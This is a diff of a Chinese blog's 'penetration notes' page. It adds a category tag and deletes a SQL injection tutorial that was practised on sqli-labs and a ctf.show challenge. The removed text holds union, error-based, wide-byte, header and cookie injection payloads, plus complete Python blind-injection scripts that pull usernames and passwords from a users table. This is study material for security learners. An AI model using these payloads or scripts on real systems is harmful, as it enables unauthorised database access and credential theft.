@@ -181,7 +181,16 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-12-25 11:27:18 / 修改时间：12:03:05" itemprop="dateCreated datePublished" datetime="2023-12-25T11:27:18+08:00">2023-12-25</time>
+              <time title="创建时间：2023-12-25 11:27:18 / 修改时间：12:05:53" itemprop="dateCreated datePublished" datetime="2023-12-25T11:27:18+08:00">2023-12-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">渗透笔记</span></a>
+                </span>
             </span>
 
           
@@ -195,258 +204,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a><strong>字符型注入</strong></h1><h2 id="注入逻辑"><a href="#注入逻辑" class="headerlink" title="注入逻辑"></a><strong>注入逻辑</strong></h2><blockquote>
-<p><strong>通过mysql爆数据的时候，MySQL库在5.0后才会出来information_schema</strong></p>
-<p><strong>1.先判断闭合，看id后面的闭合是什么情况，有”)和”和”),让id闭合</strong></p>
-<p><strong>id&#x3D;1,看报错信息，后面是说明符号就是什么闭合</strong></p>
-<p><strong>2.找字段  order by 直接接在后面不用加union</strong></p>
-<p><strong>3.查数据库</strong></p>
-<p><strong>union select  group_concat(schema_name) from information_schema.schemata – -</strong></p>
-<p><strong>4.找出表格的名字</strong></p>
-<p><strong>5.找到字段</strong></p>
-<p><strong>6.就可以查询要找的内容</strong></p>
-</blockquote>
-<h2 id="找闭合点"><a href="#找闭合点" class="headerlink" title="找闭合点"></a><strong>找闭合点</strong></h2><blockquote>
-<p><strong>?id&#x3D;1’</strong></p>
-<p><strong>?id&#x3D;1”</strong></p>
-<p><strong>结果一：如果都报错</strong></p>
-<p><strong>判断闭合符为：整形闭合。</strong></p>
-<p><strong>结果二：如果单引号报错，双引号不报错。</strong></p>
-<p><strong>继续尝试</strong></p>
-<p><strong>?id&#x3D;1’ –-+</strong></p>
-<p><strong>结果1：无报错</strong></p>
-<p><strong>判断闭合符为：单引号闭合。</strong></p>
-<p><strong>结果2：报错</strong></p>
-<p><strong>判断闭合符可能为：单引号加括号。</strong></p>
-<p><strong>结果三：如果单引号不报错，双引号报错。</strong></p>
-<p><strong>继续尝试</strong></p>
-<p><strong>?id&#x3D;1” -–+</strong></p>
-<p><strong>结果1：结果无报错</strong></p>
-<p><strong>判断闭合符为：双引号闭合。</strong></p>
-<p><strong>结果2：报错</strong></p>
-<p><strong>判断闭合符可能为：双引号加括号。</strong></p>
-<p><strong>注意：这里的括号不一定只有一个，闭合符里是允许多个括号组合成闭合符的，具体要判段有多少个括号，可以使用二分法来快速判断。</strong></p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251131157.png"></p>
-<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>select 1,2,3  出现三列数据</strong></p>
-<p><strong>当要去匹配回显位的时候，可以在回显为插入自己想要运行的语句，</strong></p>
-<p><strong>假如2是回显位  select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database()</strong></p>
-<p><strong>group_concat(table_name)     将多个数据放在一排，多行结果放在一行输出</strong></p>
-<p><strong>information_schema.table   调出所有表的信息</strong></p>
-<p><strong>意思：information_schema.tables  information_schema的tables表下面</strong></p>
-<h3 id="先找列数，然后找表名，再找字段名，然后查询"><a href="#先找列数，然后找表名，再找字段名，然后查询" class="headerlink" title="先找列数，然后找表名，再找字段名，然后查询"></a>先找列数，然后找表名，再找字段名，然后查询</h3><h4 id="查列数-order-by-4"><a href="#查列数-order-by-4" class="headerlink" title="查列数 order by  4"></a>查列数 order by  4</h4><p><strong>可以按照列排序，去试出来每一行有多少列</strong></p>
-<h4 id="找出表格的名字"><a href="#找出表格的名字" class="headerlink" title="找出表格的名字"></a>找出表格的名字</h4><blockquote>
-<p><strong>select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</strong></p>
-</blockquote>
-<h4 id="找到字段的名字"><a href="#找到字段的名字" class="headerlink" title="找到字段的名字"></a>找到字段的名字</h4><blockquote>
-<p>select group_concat(column_name)  from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database()</p>
-</blockquote>
-<p>这里的table_name是你要查询的表名</p>
-<p>information_schema.columns是一个系统表，在information_schema的columns表里面，包含了数据库中所有表的列信息。</p>
-<blockquote>
-<ol>
-<li>table_name&#x3D;’users’：这个条件表示只选择表名为’users’的记录。</li>
-<li>table_schema&#x3D;database()：这个条件表示只选择当前数据库的表。database()函数返回当前数据库的名称。</li>
-</ol>
-</blockquote>
-<h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4><blockquote>
-<p>select group_concat(id,username,password) from users</p>
-</blockquote>
-<h4 id="一些系统函数"><a href="#一些系统函数" class="headerlink" title="一些系统函数"></a>一些系统函数</h4><blockquote>
-<p>database() ,user()</p>
-<p>两个方法可以查询当前数据库</p>
-<p>where  table_schema&#x3D;database()  限制查询当前数据库</p>
-<p>select @@basedir;  查路径</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251141163.png"></p>
-<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h2><blockquote>
-<p><strong>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</strong></p>
-<p><strong>extractvalue(1,concat(0x7e,(select user()),0x7e))</strong></p>
-<p><strong>updatexml(1,concat(0x7e,(select user())),1)</strong></p>
-<p><strong>geometrycollection((select * from(select * from(select user())a)b))</strong></p>
-<p><strong>multipoint((select * from(select * from(select user())a)b))</strong></p>
-<p><strong>polygon((select * from(select * from(select user())a)b))</strong></p>
-<p><strong>multipolygon((select * from(select * from(select user())a)b))</strong></p>
-<p><strong>linestring((select * from(select * from(select user())a)b))</strong></p>
-<p><strong>multilinestring((select * from(select * from(select user())a)b))</strong></p>
-<p><strong>exp(~(select * from(select user())a))</strong></p>
-</blockquote>
-<h2 id="经常使用的函数"><a href="#经常使用的函数" class="headerlink" title="经常使用的函数"></a>经常使用的函数</h2><h3 id="updatexml-1-concat-0x7e-select-user-1"><a href="#updatexml-1-concat-0x7e-select-user-1" class="headerlink" title="updatexml(1,concat(0x7e,(select user())),1)"></a><strong>updatexml(1,concat(0x7e,(select user())),1)</strong></h3><blockquote>
-<p><strong>-1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)– -</strong></p>
-<p><strong>-1’ and updatexml(1,concat(0x7e,(select group_concat(username) from (select username from users)a)),1)#</strong></p>
-</blockquote>
-<h3 id="显示更多的字符"><a href="#显示更多的字符" class="headerlink" title="显示更多的字符"></a>显示更多的字符</h3><p><strong>由于报错回显最多32位字符串，所以导致了回显不全的问题，我们可以利用字符串截断函数进行截断回显，这里我们使用mid函数，截断查询语句，从第32位开始查看回显31位字符串，也就是mid(SQL语句,32,31)</strong></p>
-<p><strong><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251143885.png"></strong></p>
-<blockquote>
-<p><strong>-1’ and updatexml(1,concat(0x7e,mid((select group_concat(username) from (select username from users)a),32,32)),1)</strong></p>
-<p><strong>现在直接从32开始到64开始</strong></p>
-</blockquote>
-<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p><strong>用if(ascii(substr(database(),1,1))&gt;115,1,0)用这个函数去判断</strong></p>
-<h2 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;http://192.168.2.70/sqli/Less-8/?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,0)-- -</span><br><span class="line">if判断对错，用and连接，如果都对就报you are in </span><br><span class="line">ascii 将里面的语句转化为ascii码，地址栏里面使用ascii码传数据</span><br><span class="line">substr(database(),1,1) 截取database()里面的第一个字符, database后面是的1是变量，这里的意思是查询第一个字符，</span><br><span class="line">可以将这个设为变量去变量每一个字符,第三个参数是长度</span><br><span class="line">&gt;&#123;mid&#125; 判断是否为大于，大于为ture,小于为false  这里可以设置为变量，去找出符合这个值的ascii码</span><br><span class="line">这里用的session就是每个页面都是相关联的</span><br><span class="line">如果文本中有you are in 就说明是正确的，就大于中间值，就将初始值改成中间值</span><br><span class="line">如果没有，就说明是小于，就将结束值改成中间值</span><br><span class="line">&#123;1&#125;,1,0) 用了if语句，如果是真的就返回第一个，如果是假的就返回第二个</span><br><span class="line">如果中间值等于32就说明比初始值还低，就直接退出循环</span><br><span class="line">找到所有满足条件的语句，将语句追加到name</span><br><span class="line">chr()函数是Python的内置函数，它可以将一个ASCII码转换为对应的字符 </span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment">#找出api,这个是注入的api,这个要找对，找不对没有值</span></span><br><span class="line"><span class="comment">#可以f12里面可以找到</span></span><br><span class="line">url = <span class="string">&quot;http://4cd4bfb2-24b0-4483-83bf-bad37a9a29b5.challenge.ctf.show/api/v4.php?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_2</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            payload = url + <span class="string">f&quot;/**/and/**/if(ascii(substr(username(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)--+&quot;</span></span><br><span class="line">            <span class="comment">#这里的username可以换成自己想要查询的语句</span></span><br><span class="line">            <span class="comment">#更换语句的时候，记得在外面加括号</span></span><br><span class="line">            <span class="comment">#其中(database())为子查询，需要加括号，如下图</span></span><br><span class="line">            response = session.get(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(mid))</span><br><span class="line">                start = mid + <span class="number">1</span></span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">db_2()</span><br></pre></td></tr></table></figure>
-
-<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment">#找出api,这个是注入的api,这个要找对，找不对没有值</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.78/sqli/Less-9/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_2</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            payload = url + <span class="string">f&quot;/**/and/**/if(ascii(substr((select group_concat(id,username,password) from users ),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,SLEEP(3),null)--+&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            start_time = time.time() <span class="comment">#增加了一个起始时间</span></span><br><span class="line">            response = session.get(payload)</span><br><span class="line">            <span class="keyword">if</span> (time.time() - start_time) &gt;= <span class="number">3</span>:<span class="comment">#如果运行时间超过三秒，就说明判断成功</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(mid)) <span class="comment">#因为可能会有网络延迟，应该是&gt;=3</span></span><br><span class="line">                start = mid + <span class="number">1</span></span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">db_2()</span><br></pre></td></tr></table></figure>
-
-<h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.59/sqli/Less-16/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_2</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span>  <span class="comment"># 使用可打印的ASCII范围32到127</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            mid = (start + end) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;uname&quot;</span>: <span class="string">f&#x27;-1&quot;) or if(ascii(substr((select group_concat(id,username,password) from users),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)-- -&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = session.post(url, data=data)</span><br><span class="line">            <span class="comment"># print(response.text)</span></span><br><span class="line">            <span class="comment"># print(len(response.text))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="comment"># 如果内容大于某个长度，假设SQL条件为真</span></span><br><span class="line">                start = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">            <span class="comment"># 调试输出来理解过程</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;测试位置 <span class="subst">&#123;i&#125;</span>, 字符ASCII: <span class="subst">&#123;mid&#125;</span>, start = <span class="subst">&#123;start&#125;</span>, end = <span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 循环结束后需要重新设置mid点</span></span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        found_char = <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:  <span class="comment"># 如果ASCII是32（空格），可能表示结束</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        name += found_char</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到的字符: <span class="subst">&#123;found_char&#125;</span>, 目前的数据库名称: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;最终数据库名称: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db_2()</span><br></pre></td></tr></table></figure>
-
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><blockquote>
-<p>这里以sqli-lib-32关为例</p>
-<p>mysql默认是GBK编码，BGK汉字编码，两个字节代表一个汉字，一个字节代表一个英文或者数字</p>
-<p>那么，两个字节就是宽字节，一个字节就是窄字节</p>
-<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
-</blockquote>
-<h2 id="漏洞出现原因"><a href="#漏洞出现原因" class="headerlink" title="漏洞出现原因"></a>漏洞出现原因</h2><p><strong>mysql默认使用BGK编码，当mysql使用bgk编码时，会认为两个字符是一个汉字，(前一个ASCII码要大于128，才会得到汉字范围)，这就是mysql的特性，因为BGK是多字节编码，它认为两个字节是一个汉字，我们在代入参数时，代入 %df%27，%27 是 单引号 的url编码</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 当 我们进行 SQL注入时，会进行一下操作</span><br><span class="line"></span><br><span class="line">    （1）?id=1&#x27; and 1=1%23</span><br><span class="line">    	# 这是正常的语句，我们不放使用SQL语句看一下</span><br><span class="line">    	select * from user where id=&#x27;1&#x27; and 1=1#&#x27;</span><br><span class="line">    	</span><br><span class="line">    	# 当php使用函数对接受的参数做了处理后，将单引号转义，在单引号前面加上了 转义符“\&quot;</span><br><span class="line">    	在sql中的语句是：</span><br><span class="line">    	select * from user where id=&#x27;1\&#x27; and 1=1#&#x27;</span><br><span class="line">    	# 这时代入数据库查看,这是明显没有注入成功的，因为前面的单引号没有闭合</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    (2) 当我们代入了 %df 时，在数据库中就变成了</span><br><span class="line">    	?id=1%DF&#x27; and 1=1%23</span><br><span class="line">    	这时，转义函数，还会对我们输入的单引号进行转义，转义成（\&#x27;）,而&quot;\&quot;的url编码为 %5C</span><br><span class="line">    	在url中就变成了：%DF%5c%27</span><br><span class="line">    	当编码为bgk时，%5c会和前面的%df拼合，形成一个汉字（運）</span><br><span class="line">    	从而闭合掉了后面的引号，查询成功</span><br><span class="line">    	</span><br><span class="line">    	最后的sql语句是：</span><br><span class="line">    	select * from user where id=&#x27;1運&#x27; and 1=1#&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞出现的条件"><a href="#漏洞出现的条件" class="headerlink" title="漏洞出现的条件"></a>漏洞出现的条件</h2><ol>
-<li><strong>mysql使用了BGK编码</strong></li>
-<li><strong>php对传入的参数进行了转义</strong></li>
-</ol>
-<h2 id="sqli靶场测试"><a href="#sqli靶场测试" class="headerlink" title="sqli靶场测试"></a>sqli靶场测试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 首先了解PHP函数</span><br><span class="line">mysql_real_escape_string()</span><br><span class="line">mysql_escape_string()</span><br><span class="line">addslashes()</span><br><span class="line">magic_quotes_gpc()</span><br></pre></td></tr></table></figure>
-
-<h3 id="测试注入点"><a href="#测试注入点" class="headerlink" title="测试注入点"></a>测试注入点</h3><p>正常页面：</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251151502.png"></p>
-<p>测试注入点</p>
-<p>输入单引号测试注入点   ?id&#x3D;1’</p>
-<p>发现把单引号给我们注释掉了</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251152385.png"></p>
-<p>单引号被注释掉了，这是我们思路应该是，使用编码绕过，或者宽字节</p>
-<p>首先试用编码绕过吧！！ 毕竟刚开始学习，多走些弯路，总结经验，还是好的！！</p>
-<p>发现并没有什么用，1&#x3D;1 的时候 还是报错</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251153302.png"></p>
-<p>开始使用宽字节注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=1%DF&#x27;</span><br><span class="line"></span><br><span class="line">输入%DF页面报错，</span><br><span class="line">现在的sql语句是</span><br><span class="line">select * from user where id=&#x27;1%df\&#x27;&#x27;</span><br><span class="line">select * from user where id=&#x27;1%df%5c&#x27;&#x27;</span><br><span class="line">最后带入查询的是：</span><br><span class="line">select * from user where id=&#x27;1運&#x27;&#x27;</span><br></pre></td></tr></table></figure>
-
-<h1 id="header注入"><a href="#header注入" class="headerlink" title="header注入"></a>header注入</h1><blockquote>
-<h2 id="Header简介"><a href="#Header简介" class="headerlink" title="Header简介"></a>Header简介</h2><p>什么是Header头？</p>
-<p>通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机的响应消息。这两种类型的消息由一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。HTTP的头域包括通用头，请求头，响应头和实体头四个部分。每个头域由一个域名，冒号（:）和域值三部分组成。域名是大小写无关的，域值前可以添加任何数量的空格符，头域可以被扩展为多行，在每行开始处，使用至少一个空格或制表符。cookie也属于header头。</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: www.baidu.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-
-<h2 id="Header注入原理"><a href="#Header注入原理" class="headerlink" title="Header注入原理"></a>Header注入原理</h2><p>什么是Header注入？</p>
-<blockquote>
-<p><strong>Header注入，该注入是指利用后端验证客户端口信息（比如常用的cookie验证）或者通过Header中获取客户端的一些信息（比如User-Agent用户代理等其他Header字段信息），因为这些信息在某些地方是会和其他信息一起存储到数据库中，然后再在前台显示出来，又因为后台没有进过相对应的信息处理所以构成了sql注入。</strong></p>
-</blockquote>
-<blockquote>
-<p><strong>引入知识：</strong></p>
-<p><strong>超全局变量</strong></p>
-<p><strong>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。这些超全局变量是：</strong></p>
-<p><strong>$_REQUEST （获取GET&#x2F;POST&#x2F;COOKIE） COOKIE在新版本已经无法获取了</strong></p>
-<p><strong>$_POST  （获取POST传参）</strong></p>
-<p><strong>$_GET  (获取GET的传参)</strong></p>
-<p><strong>$_COOKIE   （获取COOKIE的值）</strong></p>
-<p><strong>$_SERVER  （包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）</strong></p>
-<p><strong>$_SERVER 常用方法：</strong></p>
-<p><strong>$_SERVER[‘HTTP_HOST’]  请求头信息中的Host内容，获取当前域名。</strong></p>
-<p><strong>$_SERVER[“HTTP_USER_AGENT”]  获取用户相关信息，包括用户浏览器、操作系统等信息。</strong></p>
-<p><strong>$_SERVER[“REMOTE_ADDR”]  浏览网页的用户ip。</strong></p>
-<p><strong>updatexml()函数</strong></p>
-<p><strong>updatexml() 更新xml文档的函数</strong></p>
-<p><strong>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</strong></p>
-<p><strong>接下来会有单独文章介绍报错函数</strong></p>
-<p><strong>updatexml(1,concat(0x7e,(SELECT database())),1)</strong></p>
-<p><strong>实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了</strong></p>
-<p><strong>但是报错的时候他其实已经执行了那个子查询代码！注意：必须使用concat函数拼接一个特殊字符才会报错，如下图</strong></p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251156728.png"></p>
-<h1 id="cookies注入"><a href="#cookies注入" class="headerlink" title="cookies注入"></a>cookies注入</h1><p>cookies注入也在header注入里面但是，但是cookies注入需要转码</p>
-<p>找到index.php的包</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251158836.png"></p>
-<p>当把除了cookies以下的包头都删除，发现没有什么差别</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251200123.png"></p>
-<p>尝试在cookies上面进行传参</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251201058.png"></p>
-<p>查询后，才知道cookies是经过js传参的,编码是basea64</p>
-<p>把查询语句直接放在base64转码</p>
